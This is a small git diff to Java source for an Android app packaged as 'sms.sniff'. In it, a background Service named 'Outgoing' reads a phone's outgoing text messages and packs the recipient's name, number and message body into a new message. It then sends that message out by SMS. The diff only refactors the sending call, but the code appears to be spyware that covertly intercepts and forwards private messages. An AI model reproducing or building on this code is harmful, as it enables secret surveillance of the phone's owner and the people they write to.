@@ -1,5 +1,7 @@
 package sms.sniff;
 
+import sms.sniff.utils.SMS;
+import sms.sniff.utils.Utils;
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Intent;
@@ -70,7 +72,7 @@ public class Outgoing extends Service {
 						   + "Para: " + contactName + " (" + destinationPhoneNumber + ")" + "\n"
 						   + "Conteudo: " + body;
 
-			new SendSMS(message, destinationPhoneNumber);
+			new SMS(message).sendComparingWith(destinationPhoneNumber);
 			
 			cursor.close();
 			
